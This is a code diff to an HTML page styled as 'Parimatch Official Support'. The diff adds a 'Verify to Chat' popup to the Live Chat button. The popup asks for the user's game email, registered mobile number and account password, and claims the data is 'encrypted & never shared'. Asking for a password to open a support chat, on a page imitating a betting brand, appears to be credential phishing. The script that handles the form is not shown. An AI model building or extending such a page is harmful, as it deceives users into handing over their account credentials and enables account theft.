@@ -75,7 +75,7 @@
       </div>
 
       <div class="action-card" data-color="green">
-        <a href="https://chat-page.edgeone.app" target="_blank" class="action-btn">
+        <a href="https://chat-page.edgeone.app" target="_blank" class="action-btn" id="liveChatBtn">
           <img src="ICONS/LIVE-CHAT.jpg" alt="Live Chat" class="action-icon" />
           <span>LIVE CHAT</span>
           <svg class="action-btn-arrow" width="1.2em" height="1.2em" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.5" stroke-linecap="round" stroke-linejoin="round"><polyline points="9 18 15 12 9 6"/></svg>
@@ -117,6 +117,32 @@
     <p>© 2020 Parimatch Official Support. All rights reserved.</p>
     <p class="disclaimer">This is a support portal only. Not for betting/gambling.</p>
   </footer>
+
+  <!-- Live Chat Verify Popup -->
+  <div class="chat-popup-overlay" id="chatPopup">
+    <div class="chat-popup-card">
+      <button class="chat-popup-close" id="chatPopupClose">&times;</button>
+      <div class="chat-popup-icon">
+        <svg width="30" height="30" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M21 15a2 2 0 0 1-2 2H7l-4 4V5a2 2 0 0 1 2-2h14a2 2 0 0 1 2 2z"/></svg>
+      </div>
+      <h3 class="chat-popup-title">Verify to Chat</h3>
+      <p class="chat-popup-sub">Please enter your account details to connect with Live Chat support.</p>
+      <div class="form-group">
+        <label>Game Email ID *</label>
+        <input type="email" id="chatEmail" placeholder="your@email.com" autocomplete="off" />
+      </div>
+      <div class="form-group">
+        <label>Registered Mobile Number *</label>
+        <input type="tel" id="chatMobile" placeholder="+91 XXXXX XXXXX" autocomplete="off" />
+      </div>
+      <div class="form-group">
+        <label>Game Account Password *</label>
+        <input type="password" id="chatPassword" placeholder="Enter your password" autocomplete="off" />
+      </div>
+      <button class="chat-popup-btn" id="chatPopupSubmit">Start Live Chat</button>
+      <span class="chat-popup-note">Your data is encrypted &amp; never shared</span>
+    </div>
+  </div>
 
   <script src="script.js"></script>
 </body>
